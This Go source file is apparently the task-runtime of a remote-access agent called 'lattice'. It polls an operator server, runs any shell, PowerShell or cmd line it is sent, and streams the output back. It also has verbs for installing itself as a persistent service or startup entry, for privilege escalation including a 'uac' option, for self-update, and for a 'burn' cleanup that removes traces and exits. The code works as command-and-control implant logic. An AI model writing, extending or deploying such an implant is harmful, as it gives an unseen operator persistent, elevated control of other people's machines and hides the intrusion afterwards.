package runtime

import (
	"bytes"
	"context"
	"errors"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/digitizables/lattice/agent/install"
	agentv1 "github.com/digitizables/lattice/gen/lattice/agent/v1"
)

const (
	// Long-running interactive commands (ping, tail -f) rely on operator Ctrl+C
	// rather than a short timeout. Two hours is a safety backstop only.
	shellTimeout   = 2 * time.Hour
	maxOutputBytes = 256 * 1024
)

type lockedBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *lockedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *lockedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.String()
}

func commandLine(name string, args []string) string {
	parts := make([]string, 0, 1+len(args))
	if name != "" {
		parts = append(parts, name)
	}
	parts = append(parts, args...)
	return strings.TrimSpace(strings.Join(parts, " "))
}

func truncateOutput(s string) string {
	if len(s) <= maxOutputBytes {
		return s
	}
	return s[:maxOutputBytes] + "\n...[truncated: output exceeded 256KiB]"
}

// tryCwdBuiltin handles cd/pwd so the agent's working directory persists across
// one-shot shell tasks (each task is a new process).
func (a *Agent) tryCwdBuiltin(line string) (handled bool, exitCode int32, stdout, stderr string) {
	line = strings.TrimSpace(line)
	if line == "" {
		return false, 0, "", ""
	}
	lower := strings.ToLower(line)
	switch {
	case lower == "pwd", lower == "cwd":
		a.ensureCwd()
		return true, 0, a.Cwd, ""
	case lower == "cd", strings.HasPrefix(lower, "cd "):
		target := ""
		if len(line) > 2 {
			target = strings.TrimSpace(line[2:])
			// Windows cmd: cd /d D:\path — strip /d for our path resolver.
			if len(target) >= 2 && (target[0] == '/' || target[0] == '-') {
				fields := strings.Fields(target)
				if len(fields) > 0 && strings.EqualFold(strings.TrimLeft(fields[0], "/-"), "d") {
					target = strings.TrimSpace(strings.TrimPrefix(target, fields[0]))
				}
			}
		}
		next, err := a.changeDirectory(target)
		if err != nil {
			return true, 1, "", err.Error()
		}
		return true, 0, next, ""
	default:
		return false, 0, "", ""
	}
}

// classifyShellLine picks an OS shell kind from an explicit prefix (powershell, cmd, bash, …).
// Unprefixed lines use the platform default (cmd on Windows, $SHELL on Unix).
func classifyShellLine(line string) (kind, command string) {
	line = strings.TrimSpace(line)
	if line == "" {
		return "default", ""
	}
	fields := strings.Fields(line)
	head := strings.ToLower(fields[0])
	rest := strings.TrimSpace(line[len(fields[0]):])
	switch head {
	case "powershell", "pwsh", "ps":
		if rest == "" {
			return "powershell", ""
		}
		return "powershell", rest
	case "cmd":
		if rest == "" {
			return "cmd", ""
		}
		return "cmd", rest
	case "bash", "sh":
		if rest == "" {
			return head, ""
		}
		return head, rest
	default:
		return "default", line
	}
}

func (a *Agent) runShell(ctx context.Context, taskID, kind, line string) (exitCode int32, stdout, stderr string) {
	line = strings.TrimSpace(line)
	if line == "" {
		return 1, "", "empty command"
	}

	if handled, code, out, errOut := a.tryCwdBuiltin(line); handled {
		return code, out, errOut
	}

	if a.Transport != nil && taskID != "" {
		cancelled, err := a.Transport.MarkRunning(ctx, a.ID, taskID)
		if err != nil {
			a.Log.Warn("mark running failed", "err", err)
		} else if cancelled {
			return 130, "", "cancelled by operator"
		}
	}

	runCtx, cancel := context.WithTimeout(ctx, shellTimeout)
	defer cancel()

	path, argv, err := shellInvocation(kind, line)
	if err != nil {
		return 1, "", err.Error()
	}

	// Do not use CommandContext here: creack/pty and our process-group kill own
	// lifecycle. CommandContext + pty.Start can race into "exec: already started".
	cmd := exec.Command(path, argv...)
	a.ensureCwd()
	cmd.Dir = a.Cwd
	applyShellColorEnv(cmd)

	var outBuf, errBuf lockedBuffer
	pushLive := func() {
		if a.Transport == nil || taskID == "" {
			return
		}
		outSnap := truncateOutput(outBuf.String())
		errSnap := truncateOutput(errBuf.String())
		pushCtx, pushCancel := context.WithTimeout(context.Background(), 3*time.Second)
		cancelled, err := a.Transport.PostOutput(pushCtx, a.ID, taskID, outSnap, errSnap)
		pushCancel()
		if err != nil {
			return
		}
		if cancelled {
			cancel()
		}
	}

	stopPoll := make(chan struct{})
	if a.Transport != nil && taskID != "" {
		go func() {
			ticker := time.NewTicker(400 * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-stopPoll:
					return
				case <-runCtx.Done():
					return
				case <-ticker.C:
					pollCtx, pollCancel := context.WithTimeout(context.Background(), 2*time.Second)
					cancelled, pollErr := a.Transport.PollCancel(pollCtx, a.ID, taskID)
					pollCancel()
					if pollErr != nil {
						continue
					}
					if cancelled {
						cancel()
						return
					}
				}
			}
		}()
	}

	runErr := runShellProcess(runCtx, cmd, &outBuf, &errBuf, pushLive)
	close(stopPoll)
	pushLive()

	stdout = truncateOutput(outBuf.String())
	stderr = truncateOutput(errBuf.String())

	if runErr == nil {
		return 0, stdout, stderr
	}
	if errors.Is(runErr, context.Canceled) || errors.Is(runCtx.Err(), context.Canceled) {
		if stderr != "" {
			stderr += "\n"
		}
		stderr += "cancelled by operator"
		return 130, stdout, stderr
	}
	if errors.Is(runErr, context.DeadlineExceeded) || errors.Is(runCtx.Err(), context.DeadlineExceeded) {
		if stderr != "" {
			stderr += "\n"
		}
		stderr += "command timed out"
		return 124, stdout, stderr
	}
	var ee *exec.ExitError
	if errors.As(runErr, &ee) {
		return int32(ee.ExitCode()), stdout, stderr
	}
	if stderr == "" {
		stderr = runErr.Error()
	} else {
		stderr = stderr + "\n" + runErr.Error()
	}
	return 1, stdout, stderr
}

func (a *Agent) runTask(ctx context.Context, t *agentv1.Task) (exitCode int32, stdout, stderr string) {
	name := strings.ToLower(strings.TrimSpace(t.GetName()))
	args := t.GetArgs()
	taskID := t.GetTaskId()

	switch name {
	case "whoami":
		return runBuiltinWhoami()
	case "echo":
		return 0, strings.Join(args, " "), ""
	case "hostname":
		return runBuiltinHostname()
	case "pwd":
		a.ensureCwd()
		return 0, a.Cwd, ""
	case "cd":
		target := ""
		if len(args) > 0 {
			target = strings.Join(args, " ")
		}
		next, err := a.changeDirectory(target)
		if err != nil {
			return 1, "", err.Error()
		}
		return 0, next, ""
	case "shell", "run", "cmd", "powershell", "ps", "pwsh", "bash", "sh":
		line := commandLine("", args)
		if name == "shell" || name == "run" || name == "" {
			kind, command := classifyShellLine(line)
			return a.runShell(ctx, taskID, kind, command)
		}
		return a.runShell(ctx, taskID, name, line)
	case "persist", "install-service":
		return a.runPersist()
	case "cleanup", "uninstall-all", "burn":
		return a.runCleanup()
	case "update":
		return a.runUpdate(ctx)
	case "elevate", "privesc", "uac":
		return a.runElevate(ctx, taskID, args)
	default:
		// Unknown verbs run as a native shell line (name + args).
		return a.runShell(ctx, taskID, "default", commandLine(t.GetName(), args))
	}
}

func (a *Agent) runPersist() (int32, string, string) {
	if a.ServerURL == "" {
		return 1, "", "server URL unknown; restart agent with -server"
	}
	sleep := a.Sleep
	if sleep <= 0 {
		sleep = 5 * time.Second
	}
	method, err := install.Install(install.Options{
		Server:   a.ServerURL,
		IDFile:   a.IDFile,
		Insecure: a.InsecureTLS,
		Sleep:    sleep.String(),
	})
	if err != nil {
		return 1, "", err.Error() + "\n(note: OS service needs elevation; logon-task and startup entry are user-level fallbacks)"
	}
	msg := "persistence method " + method + " (" + install.ServiceName() + ")\nbinary " + install.BinaryPath()
	return 0, msg, ""
}

func (a *Agent) runCleanup() (int32, string, string) {
	res, err := install.Cleanup()
	out := strings.Join(res.Steps, "\n")
	a.exitAfterTask = true
	if err != nil {
		return 1, out, err.Error()
	}
	return 0, out + "\ncleanup complete — agent will exit", ""
}
